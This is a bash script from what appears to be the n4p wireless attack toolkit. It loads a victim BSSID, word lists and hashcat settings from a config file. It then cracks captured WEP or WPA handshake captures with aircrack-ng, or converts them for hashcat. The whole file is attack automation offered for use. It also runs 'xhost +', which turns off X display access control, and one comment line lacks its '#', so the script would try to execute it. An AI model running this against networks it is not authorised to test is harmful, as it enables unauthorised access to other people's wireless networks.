#!/bin/bash
#######################################
# Building a sane working environment #
#######################################
xhost + # This is required for hashcat
DIR_CONF=/etc/n4p/
SESSIONFOLDER=/tmp/n4p/ # Set our tmp working configuration directory

get_name() # Retrieve the config
{
    USE=$(grep $1 ${DIR_CONF}n4p.conf | awk -F= '{print $2}')
}

depends()
{
    get_name "VICTIM_BSSID="; VICTIM_BSSID=$USE
    get_name "HASHCAT_TYPE="; HASHCAT_TYPE=$USE
    get_name "HASHCAT_LOCATION="; HASHCAT_LOCATION=$USE
    get_name "HASHCAT_MODE="; HASHCAT_MODE=$USE
    get_name "WORD_LIST="; WORD_LIST=$USE
    get_name "HASHCAT_RULES="; HASHCAT_RULES=$USE
    get_name "HASHCAT_THREADS="; HASHCAT_THREADS=$USE
    get_name "CRACK="; CRACK=$USE
    get_name "ATTACK="; ATTACK=$USE
}

shallwecrack()
{
    if [[ $CRACK == "Aircrack" ]]; then
      with_aircrack
    elif [[ $CRACK == "Hashcat" ]]; then
      with_hashcat
    else
      echo "CRACK= configuration error, check config file"
    fi
}

with_aircrack()
{
  if [[ $CRACK == "Aircrack" ]]; then
    if [[ $ATTACK == "WEP" ]]; then
      #sudo xterm -T "WEP CRACK ${VICTIM_BSSID}" -geometry 90x15 -e aircrack-ng ${SESSIONFOLDER}${VICTIM_BSSID}-01.cap &>/dev/null &
      aircrack-ng ${SESSIONFOLDER}${VICTIM_BSSID}-01.cap
    elif [[ $ATTACK == "Handshake" ]]; then
      echo "$WORD_LIST     $VICTIM_BSSID"
      aircrack-ng -w ${WORD_LIST} -b ${VICTIM_BSSID} ${SESSIONFOLDER}${VICTIM_BSSID}-01.cap
    fi
  fi
}

with_hashcat()
{
  if [ -f ${SESSIONFOLDER}${VICTIM_BSSID}-01.cap ]; then
    wpaclean clean.cap ${SESSIONFOLDER}${VICTIM_BSSID}-01.cap
    aircrack-ng -J "${SESSIONFOLDER}${VICTIM_BSSID}-01.cap" "clean.cap" >> /dev/null
    rm ${SESSIONFOLDER}clean.cap
    mv ${SESSIONFOLDER}${VICTIM_BSSID}-01.cap.hccap ${SESSIONFOLDER}${VICTIM_BSSID}.hccap
    echo "${SESSIONFOLDER}${VICTIM_BSSID}.hccap created"
    hashcat
  elif [ ! -f ${SESSIONFOLDER}${VICTIM_BSSID}-01.cap ]; then
      if [ -f ${SESSIONFOLDER}${VICTIM_BSSID}.hccap ]; then
        echo "${SESSIONFOLDER}${VICTIM_BSSID}.hccap already exists"
        hashcat
      else
        # This is an odd line we shouldn't see much. The hccap conversion removes the original cap file.
        This section is prompted if the expected cap is non existent and the expected hccap is also non existent
        echo "${SESSIONFOLDER}${VICTIM_BSSID}-01.cap not found! You will need to investigate why this happened."
      fi
  else
    echo "We goffed somehow during hcap file identification"
    sleep 4
    exit 1
  fi
}

hashcat()
{
  ./${HASHCAT_LOCATION}${HASHCAT_TYPE}.bin ${HASHCAT_MODE}${HASHCAT_THREADS} ${SESSIONFOLDER}${VICTIM_BSSID}.hccap ${WORD_LIST} ${HASHCAT_RULES}
}
depends
shallwecrack